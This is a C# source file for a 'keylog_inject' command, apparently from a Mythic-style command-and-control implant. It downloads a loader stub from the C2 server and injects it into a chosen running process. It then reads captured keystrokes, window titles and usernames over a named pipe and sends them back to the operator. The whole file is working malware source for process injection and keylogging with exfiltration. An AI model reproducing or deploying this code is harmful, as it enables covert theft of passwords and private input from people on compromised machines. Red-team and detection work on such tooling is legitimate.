#define COMMAND_NAME_UPPER

#if DEBUG
#define KEYLOG_INJECT
#endif

#if KEYLOG_INJECT

using PhantomInterop.Classes;
using PhantomInterop.Classes.Collections;
using PhantomInterop.Classes.Core;
using PhantomInterop.Classes.Events;
using PhantomInterop.Enums.PhantomEnums;
using PhantomInterop.Interfaces;
using PhantomInterop.Serializers;
using PhantomInterop.Structs.PhantomStructs;
using PhantomInterop.Structs.MythicStructs;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO.Pipes;
using System.Linq;
using System.Runtime.Serialization;
using System.Text;
using System.Threading;
using ST = System.Threading.Tasks;

namespace Tasks
{
    public class keylog_inject : Tasking
    {
        [DataContract]
        internal struct KeylogInjectParameters
        {
            [DataMember(Name = "pipe_name")]
            public string PipeName;
            [DataMember(Name = "loader_stub_id")]
            public string LoaderStubId;
            [DataMember(Name = "pid")]
            public int PID;
        }
        private ConcurrentDictionary<string, ChunkStore<DataChunk>> DataStore = new ConcurrentDictionary<string, ChunkStore<DataChunk>>();
        private AutoResetEvent _msgSendEvent = new AutoResetEvent(false);
        private AutoResetEvent _msgRecvEvent = new AutoResetEvent(false);
        private AutoResetEvent _putFilesEvent = new AutoResetEvent(false);
        private AutoResetEvent _pipeConnected = new AutoResetEvent(false);

        private ConcurrentQueue<byte[]> _msgSendQueue = new ConcurrentQueue<byte[]>();
        private ThreadSafeList<KeylogInformation> _keylogs = new ThreadSafeList<KeylogInformation>();
        private ConcurrentQueue<byte[]> _putFilesQueue = new ConcurrentQueue<byte[]>();
        private ConcurrentQueue<ICommandMessage> _msgRecvQueue = new ConcurrentQueue<ICommandMessage>();
        private JsonHandler _serializer = new JsonHandler();
        private AutoResetEvent _taskComplete = new AutoResetEvent(false);
        private Action<object> _putKeylogsAction;
        List<ST.Task<bool>> uploadTasks = new List<ST.Task<bool>>();

        private bool _isFinished = false;

        public keylog_inject(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
        {
            _putKeylogsAction = (object p) =>
            {
                PipeStream ps = (PipeStream)p;
                WaitHandle[] waiters = new WaitHandle[] { _stopToken.Token.WaitHandle, _taskComplete };
                while (!_stopToken.IsCancellationRequested && !_isFinished)
                {
                    WaitHandle.WaitAny(waiters, 10000);
                    KeylogInformation[] keylogs = _keylogs.Flush();
                    if (keylogs.Length > 0)
                    {
                        bool found = false;
                        List<KeylogInformation> aggregated = new List<KeylogInformation>();
                        aggregated.Add(new KeylogInformation {
                            WindowTitle = keylogs[0].WindowTitle,
                            Username = keylogs[0].Username,
                            Keystrokes = keylogs[0].Keystrokes
                        });
                        for (int i = 1; i < keylogs.Length; i++)
                        {
                            for(int j = 0; j < aggregated.Count; j++)
                            {
                                if (aggregated[j].WindowTitle == keylogs[i].WindowTitle && aggregated[j].Username == keylogs[i].Username)
                                {
                                    KeylogInformation update = aggregated[j];
                                    update.Keystrokes += keylogs[i].Keystrokes;
                                    aggregated[j] = update;
                                    found = true;
                                    break;
                                }
                            }
                            if (!found)
                            {
                                aggregated.Add(new KeylogInformation
                                {
                                    WindowTitle = keylogs[i].WindowTitle,
                                    Username = keylogs[i].Username,
                                    Keystrokes = keylogs[i].Keystrokes
                                });
                            }
                            found = false;
                        }
                        _agent.GetTaskManager().AddTaskResponseToQueue(new MythicTaskResponse
                        {
                            TaskID = _data.ID,
                            Keylogs = aggregated.ToArray()
                        });
                    }
                }
                ps.Close();
            };
        }


        public override void Start()
        {
            MythicTaskResponse resp;
            try
            {
                KeylogInjectParameters parameters = _dataSerializer.Deserialize<KeylogInjectParameters>(_data.Parameters);
                if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
                    string.IsNullOrEmpty(parameters.PipeName))
                {
                    resp = CreateTaskResponse(
                        $"One or more required arguments was not provided.",
                        true,
                        "error");
                }
                else
                {
                    bool pidRunning = false;
                    try
                    {
                        System.Diagnostics.Process.GetProcessById(parameters.PID);
                        pidRunning = true;
                    }
                    catch
                    {
                        pidRunning = false;
                    }

                    if (pidRunning)
                    {
                        if (_agent.GetFileManager().GetFile(_stopToken.Token, _data.ID, parameters.LoaderStubId,
                                out byte[] exeAsmPic))
                        {
                            var injector = _agent.GetInjectionManager().CreateInstance(exeAsmPic, parameters.PID);
                            if (injector.Inject())
                            {
                                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                                    "",
                                    false,
                                    "",
                                    new ICommandMessage[]
                                    {
                                        Artifact.ProcessInject(parameters.PID,
                                            _agent.GetInjectionManager().GetCurrentTechnique().Name)
                                    }));
                                AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
                                client.ConnectionEstablished += OnConnectionReady;
                                client.MessageReceived += ProcessReceivedMessage;
                                client.Disconnect += OnConnectionClosed;
                                if (client.Connect(3000))
                                {
                                    WaitHandle[] waiters = new WaitHandle[]
                                    {
                                        _taskComplete,
                                        _stopToken.Token.WaitHandle
                                    };
                                    WaitHandle.WaitAny(waiters);
                                    resp = CreateTaskResponse("", true, "completed");
                                }
                                else
                                {
                                    resp = CreateTaskResponse($"Failed to connect to named pipe.", true, "error");
                                }
                            }
                            else
                            {
                                resp = CreateTaskResponse($"Failed to inject into PID {parameters.PID}", true, "error");
                            }
                        }
                        else
                        {
                            resp = CreateTaskResponse(
                                $"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})",
                                true,
                                "error");
                        }
                    }
                    else
                    {
                        resp = CreateTaskResponse(
                            $"Process with ID {parameters.PID} is not running.",
                            true,
                            "error");
                    }
                }
            }
            catch (Exception ex)
            {
                resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
            }

            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }

        private void OnConnectionClosed(object sender, PipeMessageData e)
        {
            e.Pipe.Close();
            _isFinished = true;
            _taskComplete.Set();
        }

        private void OnConnectionReady(object sender, PipeMessageData e)
        {
            System.Threading.Tasks.Task.Factory.StartNew(_putKeylogsAction, e.Pipe, _stopToken.Token);
        }

        private void ProcessReceivedMessage(object sender, PipeMessageData args)
        {
            DataChunk chunkedData = _dataSerializer.Deserialize<DataChunk>(
                Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
            lock (DataStore)
            {
                if (!DataStore.ContainsKey(chunkedData.ID))
                {
                    DataStore[chunkedData.ID] = new ChunkStore<DataChunk>();
                    DataStore[chunkedData.ID].MessageComplete += HandleIncomingData;
                }
            }
            DataStore[chunkedData.ID].AddMessage(chunkedData);
        }

        private void HandleIncomingData(object sender, ChunkEventData<DataChunk> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for (int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }

            ICommandMessage msg = _dataSerializer.DeserializeIPCMessage(data.ToArray(), mt);
            

            if (msg.GetTypeCode() != MessageType.KeylogInformation)
            {
                throw new Exception("Invalid type received from the named pipe!");
            }
            _keylogs.Add((KeylogInformation)msg);
        }
    }
}
#endif